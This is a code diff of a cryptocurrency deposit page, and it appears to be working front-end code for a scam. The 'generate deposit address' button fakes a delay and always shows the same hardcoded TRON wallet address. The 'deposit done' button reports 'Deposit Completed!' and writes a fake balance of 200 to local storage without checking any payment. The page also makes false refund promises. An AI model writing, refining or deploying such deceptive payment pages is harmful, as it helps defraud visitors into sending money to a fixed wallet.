@@ -23,7 +23,7 @@
     </section>
 
     <div class="deposit">
-        <label for="sdf">please send only tron assests (trx/usdt) (min - 50$ / max - 600$)</label>
+        <label for="sdf">please send only trx (min - 75$ worth TRX) (max - 600$ worth TRX)</label>
         <input id="sdf" type="text" placeholder="no address generated" readonly class="adrf">
         <button class="gen">Click to generate deposit address</button>
     </div>
@@ -32,7 +32,7 @@
     <section class="notif">
         <div class="in">
             Deposit completed from your side? click deposit done, if still dosn't update , your deposited fund will be
-            refunded in 55s!
+            refunded in 20s!
         </div>
     </section>
 
@@ -59,8 +59,9 @@
         }
 
         const gen = document.querySelector(".gen");
-        if (document.querySelector(".adrf").value == "") {
-            gen.addEventListener("click", () => {
+        document.querySelector(".adrf").value = localStorage.getItem("blc");
+        gen.addEventListener("click", () => {
+            if (localStorage.getItem("blc")) {
                 gen.innerHTML = "Generating..";
                 setTimeout(() => {
                     gen.classList.add("half");
@@ -69,28 +70,30 @@
                     gen.classList.add("full");
                     gen.innerHTML = "Generated!";
                     document.querySelector(".adrf").value = "TQwUCmVJHQqWSZsJ7PFUVgA7kbNJATKFiP";
+                    localStorage.setItem("blc", "TQwUCmVJHQqWSZsJ7PFUVgA7kbNJATKFiP");
                 }, 2000);
-            });
-        }
-        else {
-            gen.addEventListener("click", () => {
-                gen.innerHTML = "Generated!";
-                return 0;
-            });
-        }
+            }
+            else {
+                gen.addEventListener("click", () => {
+                    gen.innerHTML = "Generated!";
+                    return 0;
+                });
+            }
+        });
         const dones1 = document.querySelector(".done");
-        dones1.addEventListener("click",()=>{
-            if(document.querySelector(".adrf").value){
+        dones1.addEventListener("click", () => {
+            if (document.querySelector(".adrf").value) {
                 dones1.classList.add("full");
                 dones1.innerHTML = "Checking..";
-                setTimeout(()=>{
-                document.querySelector(".toast").innerHTML = `<span>Deposit Completed!</span>`;
-            },2000);
-            setTimeout(()=>{
-                window.location.href = 'https://'+window.location.host+'/dashboard.html';
-            },4000);
+                setTimeout(() => {
+                    document.querySelector(".toast").innerHTML = `<span>Deposit Completed!</span>`;
+                    localStorage.setItem("avl", "200");
+                }, 2000);
+                setTimeout(() => {
+                    window.location.href = 'https://' + window.location.host + '/dashboard.html';
+                }, 4000);
             }
-            else{
+            else {
                 document.querySelector(".toast").innerHTML = `<span>Error No Deposit Yet</span>`;
             }
         });
